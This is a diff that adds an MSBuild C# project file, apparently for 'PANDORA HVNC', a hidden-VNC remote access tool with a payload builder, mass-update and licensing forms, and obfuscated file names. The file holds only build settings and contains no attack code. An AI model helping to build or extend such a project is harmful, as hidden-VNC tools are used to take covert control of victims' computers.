@@ -1,0 +1,167 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{598E336E-F82E-47EF-B275-983A2BB8D95A}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>HVNC</RootNamespace>
+    <AssemblyName>⨳ R O S E ⨳</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>⨳ R O S E ⨳.ico</ApplicationIcon>
+    <StartupObject>HVNC.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Guna.UI2">
+      <HintPath>..\..\..\PANDORA_HVNC-main (1)\PANDORA_HVNC-main\Guna.UI2.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="-Module-.cs" />
+    <Compile Include="AeroListView.cs" />
+    <Compile Include="EmbeddedAssembly.cs" />
+    <Compile Include="EoACK.cs" />
+    <Compile Include="eQuwi.cs" />
+    <Compile Include="FrmAbout.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmAbout.Designer.cs">
+      <DependentUpon>FrmAbout.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmBuilder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmBuilder.Designer.cs">
+      <DependentUpon>FrmBuilder.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmBuilderStatus.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmBuilderStatus.Designer.cs">
+      <DependentUpon>FrmBuilderStatus.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmLogin.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmLogin.Designer.cs">
+      <DependentUpon>FrmLogin.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMain.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmMain.Designer.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmMassUpdate.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmMassUpdate.Designer.cs">
+      <DependentUpon>FrmMassUpdate.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmRegister.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmRegister.Designer.cs">
+      <DependentUpon>FrmRegister.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmTransfer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmTransfer.Designer.cs">
+      <DependentUpon>FrmTransfer.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmURL.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmURL.Designer.cs">
+      <DependentUpon>FrmURL.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FrmVNC.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FrmVNC.Designer.cs">
+      <DependentUpon>FrmVNC.cs</DependentUpon>
+    </Compile>
+    <Compile Include="fxNQk.cs" />
+    <Compile Include="gQRQP.cs" />
+    <Compile Include="jHLGB.cs" />
+    <Compile Include="KeyAuth\api.cs" />
+    <Compile Include="KeyAuth\encryption.cs" />
+    <Compile Include="KeyAuth\json_wrapper.cs" />
+    <Compile Include="KfVcr.cs" />
+    <Compile Include="ListViewColumnSorter.cs" />
+    <Compile Include="NativeMethods.cs" />
+    <Compile Include="NativeMethodsHelper.cs" />
+    <Compile Include="PlatformHelper.cs" />
+    <Compile Include="pnOoT.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Properties\Resources.cs" />
+    <Compile Include="Properties\Settings.Designer.cs">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="QsaYH.cs" />
+    <Compile Include="qWPNv.cs" />
+    <Compile Include="Resources\Source.cs" />
+    <Compile Include="sBmsy.cs" />
+    <Compile Include="Utils\BuildInfo.cs" />
+    <Compile Include="Utils\Utils.cs" />
+    <Compile Include="WebBuilder\WebBuilder.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="FrmAbout.resources" />
+    <EmbeddedResource Include="FrmBuilder.resources" />
+    <EmbeddedResource Include="FrmBuilderStatus.resources" />
+    <EmbeddedResource Include="FrmLogin.resources" />
+    <EmbeddedResource Include="FrmMain.resources" />
+    <EmbeddedResource Include="FrmMassUpdate.resources" />
+    <EmbeddedResource Include="FrmRegister.resources" />
+    <EmbeddedResource Include="FrmTransfer.resources" />
+    <EmbeddedResource Include="FrmURL.resources" />
+    <EmbeddedResource Include="FrmVNC.resources" />
+    <EmbeddedResource Include="PandorahVNC.exe.licenses" />
+    <EmbeddedResource Include="Properties\Resources.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
